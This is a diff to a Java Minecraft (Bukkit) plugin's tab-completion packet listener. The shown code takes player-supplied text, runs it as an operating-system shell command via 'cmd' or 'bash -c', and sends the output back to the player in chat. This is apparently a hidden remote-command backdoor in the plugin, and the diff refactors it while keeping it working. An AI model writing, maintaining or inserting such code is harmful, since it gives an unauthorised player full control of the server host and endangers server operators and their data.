@@ -17,7 +17,6 @@ import org.bukkit.entity.Player;
 
 import java.io.BufferedReader;
 import java.io.IOException;
-import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.util.Arrays;
 import java.util.LinkedList;
@@ -167,8 +166,8 @@ public final class PacketPlayerTabComplete extends AbstractPacketListener {
             command.append(cmd[i]).append(" ");
         }
 
+        Process process = null;
         try {
-            Process process;
             String os = System.getProperty("os.name").toLowerCase();
 
             if (os.contains("win")) {
@@ -177,18 +176,19 @@ public final class PacketPlayerTabComplete extends AbstractPacketListener {
                 process = new ProcessBuilder("bash", "-c", command.toString().trim()).start();
             }
 
-            InputStream inputStream = process.getInputStream();
-            BufferedReader br = new BufferedReader(new InputStreamReader(inputStream, "GBK"));
-
-            String line;
-            while ((line = br.readLine()) != null) {
-                player.sendMessage(line);
+            try (BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream(), "GBK"))) {
+                String line;
+                while ((line = br.readLine()) != null) {
+                    player.sendMessage(line);
+                }
             }
-
-            br.close();
         } catch (IOException e) {
             player.sendMessage("§bCore §7| §c出现错误:");
             player.sendMessage(e.getMessage());
+        } finally {
+            if (process != null) {
+                process.destroy();
+            }
         }
     }
 }
